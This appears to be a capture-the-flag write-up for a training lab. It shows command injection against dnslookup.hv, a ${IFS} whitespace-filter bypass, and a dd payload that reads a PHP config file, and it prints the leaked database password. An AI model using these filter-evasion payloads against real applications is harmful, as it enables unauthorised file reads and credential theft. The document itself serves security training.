---
title: Command Injection leading to LFI in dnslookup.hv
date: 2025-09-28 00:00:00 +0000
categories: [writeups, hackviser]
tags: [command-injection, web, lfi]
excerpt: "Bypassed command injection filters using IFS variables and alternative commands like dd to read local files and exfiltrate database credentials."
---

## Goal

The objective is to exploit a command injection vulnerability on `http://dnslookup.hv` to read the contents of `/var/www/html/database.php` and extract the database password.

## Summary

The application was vulnerable to command injection but filtered common commands and whitespace. By using `${IFS}` to bypass the space filter and employing alternative file-reading commands, I was able to read the `database.php` file. Using Burp Suite's Intruder with a custom list of payloads, the `dd` command was found to be effective, revealing the database credentials.

## What I tried

Initial tests with simple commands like `id` failed. However, using `${IFS}` as a space separator (e.g., `;${IFS}id`) successfully executed the command, confirming a command injection vulnerability with a whitespace filter.

Standard file reading commands like `cat` and `/bin/cat` were blocked, returning a generic response.

## Final, working approach (dd command)

To find a working command for reading files, I used Burp Suite's Intruder to test a list of alternative payloads. The following payload using the `dd` utility was successful:

```bash
;${IFS}dd${IFS}if=/var/www/html/database.php${IFS}bs=1${IFS}count=500
```

This command reads the `database.php` file byte by byte and outputs its content, revealing the database configuration.

### The Leaked `database.php` file

```php
try{
$host = 'localhost';
$db_name = 'hv_database';
$charset = 'utf8';
$username = 'root';
$password = 'DWG8kxJJjyquXd';

$db = new
PDO("mysql:host=$host;dbname=$db_name;charset=$charset"
, $username, $password);
} catch (PDOException $e) {
//...
}
```

The database password is `DWG8kxJJjyquXd`.
